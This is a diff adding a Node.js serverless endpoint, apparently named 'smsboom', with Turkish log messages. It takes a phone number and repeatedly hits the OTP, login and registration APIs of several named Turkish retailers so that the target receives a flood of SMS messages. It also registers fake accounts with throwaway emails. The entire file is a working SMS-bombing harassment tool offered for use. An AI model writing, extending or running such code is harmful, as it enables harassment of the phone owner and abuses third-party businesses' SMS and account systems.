@@ -1,0 +1,194 @@
+// api/smsboom.js
+const fetch = require('node-fetch');
+
+export default async function handler(req, res) {
+  try {
+    let phone, amount;
+
+    if (req.method === 'GET') {
+      phone = req.query.phone;
+      amount = req.query.amount || 5;
+    } else if (req.method === 'POST') {
+      let body;
+      try {
+        body = JSON.parse(req.body);
+      } catch {
+        body = req.body || {};
+      }
+      phone = body.phone;
+      amount = body.amount || 5;
+    } else {
+      return res.status(405).json({
+        status: 'error',
+        message: 'Sadece GET ve POST methodu destekleniyor'
+      });
+    }
+
+    if (!phone) {
+      return res.status(400).json({
+        status: 'error',
+        message: 'phone parametresi gereklidir'
+      });
+    }
+
+    // Telefon numarasını temizle ve kontrol et
+    phone = phone.replace(/\s/g, '');
+    
+    if (phone.length !== 10 || !phone.startsWith('5')) {
+      return res.status(400).json({
+        status: 'error',
+        message: 'Telefon numarası 10 haneli ve 5 ile başlamalıdır. Örnek: 5401234567'
+      });
+    }
+
+    // Miktar sınırı
+    amount = Math.min(Math.max(parseInt(amount), 1), 20);
+
+    console.log(`📱 SMS Bomber Başlatılıyor: ${phone} - Miktar: ${amount}`);
+
+    // SMS gönderimini başlat
+    const result = await startSMSBombing(phone, amount);
+    
+    res.json({
+      status: 'completed',
+      endpoint: '/api/smsboom',
+      method: req.method,
+      phone: phone,
+      amount: amount,
+      total_sms: result.total,
+      successful: result.successful,
+      failed: result.failed,
+      details: result.details,
+      timestamp: new Date().toISOString()
+    });
+
+  } catch (error) {
+    console.error('SMS Bomber Hatası:', error);
+    res.status(500).json({
+      status: 'error',
+      message: 'SMS gönderilirken hata oluştu: ' + error.message
+    });
+  }
+}
+
+// SMS gönderme fonksiyonu
+async function startSMSBombing(phone, amount) {
+  const results = {
+    total: 0,
+    successful: 0,
+    failed: 0,
+    details: []
+  };
+
+  // SMS servisleri
+  const services = [
+    {
+      name: "Bim",
+      url: "https://bim.veesk.net/service/v1.0/account/login",
+      method: "POST",
+      data: { phone: phone }
+    },
+    {
+      name: "Migros", 
+      url: "https://rest.migros.com.tr/sanalmarket/users/login/otp",
+      method: "POST",
+      data: { phoneNumber: phone }
+    },
+    {
+      name: "A101",
+      url: "https://www.a101.com.tr/users/otp-login/",
+      method: "POST", 
+      data: { phone: phone, next: "/a101-kapida" }
+    },
+    {
+      name: "Sok",
+      url: "https://api.ceptesok.com/api/users/sendsms",
+      method: "POST",
+      data: { mobile_number: phone, token_type: "register_token" }
+    },
+    {
+      name: "Kahve Dunyasi",
+      url: "https://core.kahvedunyasi.com/api/users/sms/send",
+      method: "POST",
+      data: { mobile_number: phone, token_type: "register_token" }
+    },
+    {
+      name: "English Home",
+      url: "https://www.englishhome.com/enh_app/users/registration/",
+      method: "POST",
+      data: {
+        first_name: "Test",
+        last_name: "User", 
+        email: `test${Date.now()}@gmail.com`,
+        phone: phone,
+        password: "Test123456",
+        confirm: "true"
+      }
+    }
+  ];
+
+  // Her tur için
+  for (let round = 0; round < amount; round++) {
+    console.log(`🔄 Tur ${round + 1}/${amount} başlatılıyor...`);
+    
+    // Her servis için
+    for (const service of services) {
+      results.total++;
+      
+      try {
+        const response = await fetch(service.url, {
+          method: service.method,
+          headers: {
+            'Content-Type': 'application/json',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'application/json'
+          },
+          body: JSON.stringify(service.data),
+          timeout: 10000
+        });
+
+        const isSuccess = response.status === 200 || response.status === 202;
+        
+        if (isSuccess) {
+          results.successful++;
+          console.log(`✅ ${service.name} - Başarılı`);
+        } else {
+          results.failed++;
+          console.log(`❌ ${service.name} - Başarısız (${response.status})`);
+        }
+
+        results.details.push({
+          round: round + 1,
+          service: service.name,
+          status: isSuccess ? 'success' : 'failed',
+          status_code: response.status,
+          timestamp: new Date().toISOString()
+        });
+
+        // 3 saniye bekle (rate limit)
+        await new Promise(resolve => setTimeout(resolve, 3000));
+        
+      } catch (error) {
+        results.failed++;
+        results.details.push({
+          round: round + 1,
+          service: service.name,
+          status: 'error',
+          error: error.message,
+          timestamp: new Date().toISOString()
+        });
+        console.log(`⚠️ ${service.name} - Hata: ${error.message}`);
+      }
+    }
+    
+    console.log(`✅ Tur ${round + 1} tamamlandı. Bekleniyor...`);
+    
+    // Tur arası bekleme
+    if (round < amount - 1) {
+      await new Promise(resolve => setTimeout(resolve, 5000));
+    }
+  }
+
+  console.log(`🎉 SMS Bomber tamamlandı: ${results.successful} başarılı, ${results.failed} başarısız`);
+  return results;
+}
